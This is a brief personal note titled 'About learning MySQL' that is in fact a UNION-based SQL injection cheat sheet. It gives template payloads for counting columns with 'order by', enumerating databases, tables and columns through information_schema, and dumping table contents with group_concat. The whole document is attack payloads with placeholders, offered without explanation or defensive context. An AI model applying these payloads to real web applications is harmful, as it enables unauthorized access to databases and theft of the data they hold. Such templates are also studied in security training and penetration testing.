<div style="background-color:balck;color:green">
<h1>About learning MySQL</h1>
</div>


```

id=? order by n
union select null,null,~,n

#find_schema:
union select 1,2,~,group_concat(schema_name),~,n from information_schema.schemata
#find_tables:
union select 1,2,~,group_concat(table_name),~,n from information_schema.tables where table_schema="~~"
#find_columns:
union select 1,2,~,group_concat(column_name),~,n from information_schema.columns where table_schema="~~" and table_name="~~"

#get data
union select 1,2,~,group_concat(column),~,n from schema.table

```

